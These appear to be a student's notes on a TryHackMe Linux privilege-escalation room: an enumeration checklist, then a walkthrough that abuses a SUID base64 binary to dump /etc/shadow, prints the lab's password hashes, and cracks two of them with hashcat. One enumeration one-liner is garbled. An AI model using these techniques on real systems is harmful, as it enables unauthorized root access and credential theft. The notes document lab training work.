# Capstone Challenge 
## Reference link : https://tryhackme.com/room/linprivesc

## General Outline For Enumeration 

**General Privilege Escalation Enumeration Outline (Linux)**
=====================================================
### 🔹 1. System Information

     **uname -a**: Kernel version
     **cat /etc/*-release**: Distribution info
     **hostname**: System name
     Look for:
         * Old kernels (e.g. 2.x, early 3.x)
         * Known vulnerable distros

### 🔹 2. Current User Information

     **id**: UID, GID, groups
     **whoami**
     **who -a**: Logged in users
     Look for:
         * Group memberships (e.g. sudo, docker, lxd, adm)
         * Other users logged in

### 🔹 3. Check for Sudo Permissions

     **sudo -l**
     Look for:
         * NOPASSWD commands
         * Binaries that can be abused (e.g., less, vim, python, perl, etc.)

### 🔹 4. Check for SetUID Binaries

     **find / -perm -4000 -type f 2>/dev/null**
     Look for:
         * Uncommon or writable SetUID binaries
         * SetUID binaries you can abuse (e.g., nmap, find, cp, bash)

### 🔹 5. World Writable Files & Scripts

     **find / -writable -type f 2>/dev/null**
     Look for:
         * Scripts or binaries in /etc, /usr/local/bin, or cron jobs
         * Misconfigured scripts owned by root but writable by you

### 🔹 6. Scheduled Jobs (Cron)

     **ls -la /etc/cron* /var/spool/cron/crontabs**
     Look for:
         * Cron jobs run by root that execute writable scripts
         * World-writable cron files

### 🔹 7. Interesting Files

     **cat ~/.bash_history**: Passwords in history files
     **ls -la /root/ 2>/dev/null**: Config files (.env, .aws, .git-credentials, .ssh/, etc.)
     **ls -la /home/***: SSH private keys and other sensitive data

### 🔹 8. Check PATH & Environment Variables

     **echo $PATH**
     **env**
     Look for:
         * Writable directories in $PATH
         * Misconfigured LD_PRELOAD, LD_LIBRARY_PATH, PYTHONPATH, etc.

### 🔹 9. Running Processes

     **ps aux**
     Look for:
         * Running as root
         * Sensitive scripts or binaries being executed

### 🔹 10. Network Information

     **ip a**: Internal services running as root
     **ip r**: Open ports (may point to local privilege escalation vectors)
     **netstat -tulpn**
     Look for:
         * Internal services running as root
         * Open ports (may point to local privilege escalation vectors)

### 🔹 11. Check for Installed Programs

     **which gcc python perl wget curl nc find**: Available tools you can use to compile or run local exploits
     Look for:
         * Available tools that can be used to exploit vulnerabilities

### 🔹 12. Check for Writable Binaries in PATH

     IFS=: read -ra DIRS <<< "PATH";fordin"{DIRS[@]}"; do find "$d" -writable -type f 2>/dev/null; done
     Look for:
         * Binaries in root-executed scripts that you can overwrite

### 🔹 13. Docker / LXD Misconfigurations

     **groups**: Potential access to Docker or LXD groups → potential root access.
     **docker images**
     **lxc list**

### 🔹 14. Kernel Exploits (as last resort)

     * If nothing else works and the kernel is outdated, you can search for local exploits:
         **uname -r**
         **Use searchsploit or exploit-db.com** to search.

### 🛠 Tools You Can Use for Automation

     * **linpeas.sh**
     * **linux-exploit-suggester**
     * **LES**
     * **LinEnum**


## Information gathered so far

#### uname -a 
```bash
Linux ip-10-10-102-202 3.10.0-1160.el7.x86_64 
#1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
- Dealing with kernel version 3.10.0-1160
    - CentOS 7 / RHEL 7 
    - Released Oct 2020

- Actions done with this Information
    - Checked out exploit-db.com 
    - Searched with version string : 3-10.0-1160
    - Found two possible exploits
        - https://www.exploit-db.com/exploits/42887
        - https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c
        - ^ Neither of them worked since I was missing rootshell.h
- Threw in the towel for this enumeration

#### SUID Binary 
- Command used 
```bash
find / -type f -perm -04000 -ls 2>/dev/null

# Output
[leonard@ip-10-10-102-202 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
```

- Actions taken 
    - Checked out [GTFOBins](https://gtfobins.github.io/)
    - When checking out exploits at GTFOBins
        - Don't bother with the sudo exploits since you need sudo privileges to use them 
    - crontab -e 
        - Can be used to breakout restricted  environments by running non-interactive system commands 
        - The commands are executed according to the crontab file 
            - Edited via the **crontab** utility
        - Command : crontab -e
    - Reminder, check out just the SUID exploits 
    - Trying out base64 SUID exploit **File read**
        - Checking out /etc/shadow 
        - This directory stores all the hased passwords for ALL system accounts
        - Only root can read it 
        - Each line corresponds to a user and includes
        ```bash 
        username:hashed_password:last_change:min:max:warn:inactive:expire 
        ```
        - You can then use tools like
            - John the ripper 
            - Hashcat
    - Solution : base64 SUID exploit 
```bash
File read
    
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

LFILE=file_to_read
base64 "$LFILE" | base64 --decode

# Output for : /usr/bin/base64 /etc/shadow | base64 --decode

[leonard@ip-10-10-102-202 ~]$ /usr/bin/base64 /etc/shadow | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::   
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```
---

- Attempted to use John
  - Could only crack 2 out of the 3 passwords since the root password isn't in the wordlist
- When using Hashcat
  - Make sure to use --wordlist="Path to wordlist"
  - But this method takes forever 
- When using Hashcat    
  - You def use the GPU 
  - Command used : hashcat -m 1800 hash.txt rockyou.txt
  - Once hashcat is done, use the following command to display cracked hashes
    - Command : hashcat --show -m 1800 hash.txt
    - Output 
    ```bash 
        digital101@Digital101:~$ hashcat --show -m 1800 hash.txt
        $6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/:Penny123
        $6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
    ```
    - Hashcat stores results to a potfile by default
      - Command : hashcat --show --potfile-path ~/.hashcat/hashcat.potfile -m 1800 hash.txt
      - To view all previously cracked passwords 
        - Command : cat ~/.hashcat/hashcat.potfile
#### Cracked Password Hash Format
```bash
# Cracked line from Hashcat 
$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
# Format 
[hashed_password]:[plaintext_password]
```
#### ID'ing hash prefixes
| Prefix (starts with)   | Hash Type | Algorithm Used    |
| ---------------------- | --------- | ----------------- |
| `$1$`                  | MD5       | md5crypt          |
| `$2a$`, `$2b$`, `$2y$` | Blowfish  | bcrypt            |
| `$5$`                  | SHA-256   | sha256crypt       |
| `$6$`                  | SHA-512   | sha512crypt       |
| `no prefix`            | DES       | Legacy (insecure) |

- Example : `root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::`
    - The `$6$` means it's `SHA-512` 
    - `DWBzMoiprTTJ4gbW` is the `salt`
    - The long string after that is the `hashed password`
- Or you could use
    - hash-identifier 
    - sudo apt install hash-identifier
    - Online tools like
        - https://hashes.com/en/tools/hash_identifierhttps
        - https://www.tunnelsup.com/hash-analyzer/
